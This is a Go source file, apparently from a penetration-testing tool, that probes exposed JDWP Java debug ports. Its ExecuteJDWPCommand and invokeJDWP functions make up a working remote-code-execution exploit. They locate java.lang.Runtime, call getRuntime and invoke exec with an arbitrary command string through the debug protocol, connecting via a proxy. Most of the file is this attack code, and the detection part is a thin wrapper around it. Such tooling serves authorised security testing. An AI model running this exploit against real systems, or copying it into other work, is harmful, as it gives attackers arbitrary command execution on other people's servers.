package connectors

import (
	"MPET/backend/models"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"reflect"
	"strconv"
	"time"

	"github.com/kpli0rn/jdwpgo/common"
	"github.com/kpli0rn/jdwpgo/debuggercore"
	"github.com/kpli0rn/jdwpgo/jdwpsession"
	"github.com/kpli0rn/jdwpgo/protocol/vm"
)

// ConnectJDWP 检测 JDWP 调试端口
func (s *ConnectorService) ConnectJDWP(conn *models.Connection) {
	address := net.JoinHostPort(conn.IP, conn.Port)
	
	// 使用代理拨号
	netConn, err := s.DialWithProxy("tcp", address)
	if err != nil {
		conn.Status = "failed"
		conn.Message = fmt.Sprintf("连接失败: %v", err)
		s.AddLog(conn, fmt.Sprintf("连接失败: %v", err))
		return
	}
	defer netConn.Close()

	s.AddLog(conn, "TCP 连接成功，开始 JDWP 检测")

	// 使用 jdwpgo 库进行检测
	jdwpSession := jdwpsession.New(netConn)
	err = jdwpSession.Start()
	if err != nil {
		conn.Status = "failed"
		conn.Message = fmt.Sprintf("JDWP 握手失败: %v", err)
		s.AddLog(conn, fmt.Sprintf("JDWP 握手失败: %v", err))
		return
	}

	s.AddLog(conn, "JDWP 握手成功")

	// 获取 JVM 版本信息
	debuggerCore := debuggercore.NewFromJWDPSession(jdwpSession)
	version, err := debuggerCore.VMCommands().Version()
	if err != nil {
		s.AddLog(conn, fmt.Sprintf("获取版本信息失败: %v", err))
	} else {
		s.AddLog(conn, "成功获取 JVM 版本信息")
	}

	conn.Status = "success"
	conn.Message = "JDWP 调试端口开放"
	conn.ConnectedAt = time.Now()
	
	result := fmt.Sprintf("JDWP 调试端口检测成功\n")
	result += fmt.Sprintf("目标地址: %s:%s\n", conn.IP, conn.Port)
	result += fmt.Sprintf("协议版本: JDWP\n")
	
	if version != nil {
		result += fmt.Sprintf("\nJVM 信息:\n")
		result += fmt.Sprintf("描述: %s\n", version.Description)
		result += fmt.Sprintf("JDWP 版本: %d.%d\n", version.JwdpMajor, version.JwdpMinor)
		result += fmt.Sprintf("VM 版本: %s\n", version.VMVersion)
		result += fmt.Sprintf("VM 名称: %s\n", version.VMName)
	}
	
	result += "\n安全风险:\n"
	result += "- JDWP 调试端口暴露可能导致远程代码执行\n"
	result += "- 攻击者可以通过调试协议控制 JVM 进程\n"
	result += "- 建议立即关闭或限制访问权限\n"
	result += "\n提示: 可以在命令执行框中输入系统命令进行测试"
	
	s.SetConnectionResult(conn, result)
	s.AddLog(conn, "JDWP 检测完成")
}

// ExecuteJDWPCommand 执行 JDWP 命令（使用 jdwpgo 库）
func (s *ConnectorService) ExecuteJDWPCommand(conn *models.Connection, command string) (string, error) {
	if command == "" {
		return "", fmt.Errorf("命令不能为空")
	}

	s.AddLog(conn, fmt.Sprintf("开始执行 JDWP 命令: %s", command))

	address := net.JoinHostPort(conn.IP, conn.Port)
	
	// 使用代理拨号
	netConn, err := s.DialWithProxy("tcp", address)
	if err != nil {
		s.AddLog(conn, fmt.Sprintf("连接失败: %v", err))
		return "", fmt.Errorf("连接失败: %v", err)
	}
	defer netConn.Close()

	// 调用 invokeJDWP 函数（完全按照参考代码）
	result, err := invokeJDWP(netConn, command, s, conn)
	if err != nil {
		s.AddLog(conn, fmt.Sprintf("命令执行失败: %v", err))
		return "", err
	}

	s.AddLog(conn, "命令执行成功")
	return result, nil
}

// invokeJDWP 执行 JDWP 命令（参考代码的实现，不做任何改动）
func invokeJDWP(netConn net.Conn, command string, s *ConnectorService, conn *models.Connection) (string, error) {
	jdwpSession := jdwpsession.New(netConn)
	err := jdwpSession.Start()
	if err != nil {
		return "", fmt.Errorf("error start: %v", err)
	}

	debuggerCore := debuggercore.NewFromJWDPSession(jdwpSession)
	
	version, err := debuggerCore.VMCommands().Version()
	if err != nil {
		return "", fmt.Errorf("err = %v", err)
	}
	s.AddLog(conn, fmt.Sprintf("JVM Version: %s", version.VMVersion))

	allClasses, err := debuggerCore.VMCommands().AllClasses()
	if err != nil {
		return "", fmt.Errorf("err = %v", err)
	}

	idSizes, err := debuggerCore.VMCommands().IDSizes()
	if err != nil {
		return "", fmt.Errorf("err = %v", err)
	}
	s.AddLog(conn, fmt.Sprintf("IDSizes: %+v", idSizes))

	var runtimeClas vm.AllClassClass
	for _, clas := range allClasses.Classes {
		if clas.Signature.String() == "Ljava/lang/Runtime;" {
			runtimeClas = clas
		}
	}

	if reflect.DeepEqual(runtimeClas, vm.AllClassClass{}) {
		return "", fmt.Errorf("[-] Cannot find class Runtime")
	}
	s.AddLog(conn, fmt.Sprintf("Found Runtime class: id=%v", runtimeClas.ReferenceTypeID))

	methods, _ := debuggerCore.VMCommands().AllMethods(runtimeClas.ReferenceTypeID)
	
	getRuntimeMethod := common.GetMethodByName(methods, "getRuntime")
	if getRuntimeMethod == nil {
		return "", fmt.Errorf("[-] Cannot find method getRuntime")
	}
	s.AddLog(conn, fmt.Sprintf("Found Runtime.getRuntime(): %s", getRuntimeMethod.String()))

	threads, err := debuggerCore.VMCommands().AllThreads()
	if err != nil {
		return "", fmt.Errorf("err = %v", err)
	}

	var threadID uint64
	for _, thread := range threads.Threads {
		threadStatus, _ := debuggerCore.VMCommands().StatusThread(thread.ObjectID)
		if threadStatus.ThreadStatus == 2 {
			threadID = thread.ObjectID
			break
		}
	}

	if threadID == 0 {
		return "", fmt.Errorf("[-] Could not find a suitable thread")
	}
	s.AddLog(conn, fmt.Sprintf("Setting 'step into' event in thread: %v", threadID))

	debuggerCore.VMCommands().Suspend()
	reply, err := debuggerCore.VMCommands().SendEventRequest(1, threadID)
	debuggerCore.VMCommands().Resume()

	buf := make([]byte, 128)
	var rId int32
	var tId uint64
	num, _ := netConn.Read(buf)
	if num != 0 {
		replyData := buf[:num]
		rId, tId = common.ParseEvent(replyData, reply.RequestID, idSizes)
	}
	s.AddLog(conn, fmt.Sprintf("Received matching event from thread %v", tId))

	debuggerCore.VMCommands().ClearCommand(rId)

	// Step 1 allocating string
	createStringReply, _ := debuggerCore.VMCommands().CreateString(command)
	if createStringReply == nil {
		return "", fmt.Errorf("[-] Failed to allocate command")
	}
	cmdObjectID := createStringReply.StringObject.ObjectID
	s.AddLog(conn, fmt.Sprintf("Command string object created id:%v", cmdObjectID))

	// step 2 通过调用 getRuntime 来获取 Runtime 对象
	invokeStaticMethodReply, _ := debuggerCore.VMCommands().InvokeStaticMethod(runtimeClas.ReferenceTypeID, tId, getRuntimeMethod.MethodID)
	if invokeStaticMethodReply.ContextID == 0 {
		return "", fmt.Errorf("InvokeStaticMethod failed")
	}
	s.AddLog(conn, fmt.Sprintf("Runtime.getRuntime() returned context id:%v", invokeStaticMethodReply.ContextID))

	// step 3
	execMethod := common.GetMethodByName(methods, "exec")
	if execMethod == nil {
		return "", fmt.Errorf("Cannot find exec method")
	}
	s.AddLog(conn, fmt.Sprintf("found Runtime.exec(): id=%v", execMethod.MethodID))

	cmdObjectIDHex := make([]byte, 8)
	binary.BigEndian.PutUint64(cmdObjectIDHex, cmdObjectID)
	argsIDHex := strconv.FormatInt(int64(invokeStaticMethodReply.Tag), 16) + hex.EncodeToString(cmdObjectIDHex)
	argsID, _ := hex.DecodeString(argsIDHex)

	debuggerCore.VMCommands().InvokeMethod(invokeStaticMethodReply.ContextID, tId, runtimeClas.ReferenceTypeID, execMethod.MethodID, argsID)
	debuggerCore.VMCommands().Resume()

	result := fmt.Sprintf("命令执行成功: %s\n", command)
	result += "注意: JDWP 协议不返回命令输出\n"
	result += "如果是 Windows 系统，可以尝试: calc, notepad\n"
	result += "如果是 Linux 系统，可以尝试: touch /tmp/test"

	return result, nil
}
